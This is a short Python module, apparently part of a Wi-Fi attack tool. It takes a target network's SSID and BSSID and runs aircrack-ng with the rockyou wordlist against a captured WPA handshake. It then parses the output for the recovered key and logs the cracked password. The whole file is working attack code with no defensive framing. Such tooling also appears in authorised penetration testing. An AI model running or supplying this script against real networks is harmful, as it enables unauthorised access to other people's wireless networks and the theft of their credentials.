import subprocess
import os
from wifi.logger import log_result

def crack_password(target):
    bssid = target[1]
    ssid = target[0]
    cap_file = "handshake-01.cap"
    wordlist = "wordlists/rockyou.txt"

    if not os.path.exists(cap_file):
        print("[-] Handshake capture file not found.")
        return

    if not os.path.exists(wordlist):
        print(f"[-] Wordlist not found: {wordlist}")
        return

    print("[+] Cracking password using aircrack-ng...")
    try:
        result = subprocess.run(
            ["aircrack-ng", "-w", wordlist, "-b", bssid, cap_file],
            capture_output=True, text=True, check=True
        )
    except subprocess.CalledProcessError as e:
        print(f"[-] Error during password cracking: {e}")
        return

    for line in result.stdout.splitlines():
        if "KEY FOUND!" in line:
            password = line.split()[-1].strip('[]')
            print(f"[+] Password found: {password}")
            log_result(ssid, password)
            return
    print("[-] Password not found.")
